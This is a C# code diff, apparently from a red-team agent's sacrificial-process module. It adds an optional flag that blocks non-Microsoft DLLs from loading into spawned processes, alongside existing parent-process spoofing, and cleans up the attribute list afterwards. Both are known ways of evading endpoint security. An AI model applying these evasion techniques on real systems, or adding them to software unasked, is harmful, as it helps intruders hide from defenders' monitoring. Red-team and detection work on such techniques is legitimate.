@@ -133,15 +133,37 @@ namespace Apollo.SacrificialProcesses
             IntPtr lpSize = IntPtr.Zero;
 
             Marshal.WriteIntPtr(lpVal, hParentProc);
-
-            var result1 = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+            int dwAttributeCount = evasionArgs.BlockDlls ? 2 : 1;
+            var result1 = InitializeProcThreadAttributeList(IntPtr.Zero, dwAttributeCount, 0, ref lpSize);
             startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-            if (InitializeProcThreadAttributeList(startupInfoEx.lpAttributeList, 1, 0, ref lpSize))
-            { 
+            if (InitializeProcThreadAttributeList(startupInfoEx.lpAttributeList, dwAttributeCount, 0, ref lpSize))
+            {
+
+                // BlockDLLs
+                if (evasionArgs.BlockDlls)
+                {
+                    var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
+
+                    Marshal.WriteInt64(
+                        lpMitigationPolicy,
+                        PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+                        );
+
+                    UpdateProcThreadAttribute(
+                        startupInfoEx.lpAttributeList,
+                        0,
+                        (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                        lpMitigationPolicy,
+                        (IntPtr)IntPtr.Size,
+                        IntPtr.Zero,
+                        IntPtr.Zero
+                        );
+                }
+
                 if (UpdateProcThreadAttribute(
                 startupInfoEx.lpAttributeList,
                 0,
-                (IntPtr)0x00020000,
+                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                 lpVal,
                 (IntPtr)IntPtr.Size,
                 IntPtr.Zero,
@@ -542,6 +564,11 @@ namespace Apollo.SacrificialProcesses
                 startupInfo.hStdOutput.Close();
                 startupInfo.hStdError.Close();
                 startupInfo.hStdInput.Close();
+                if (startupInfoEx.lpAttributeList != IntPtr.Zero)
+                {
+                    DeleteProcThreadAttributeList(startupInfoEx.lpAttributeList);
+                    Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);
+                }
             });
             thr.Start();
         }
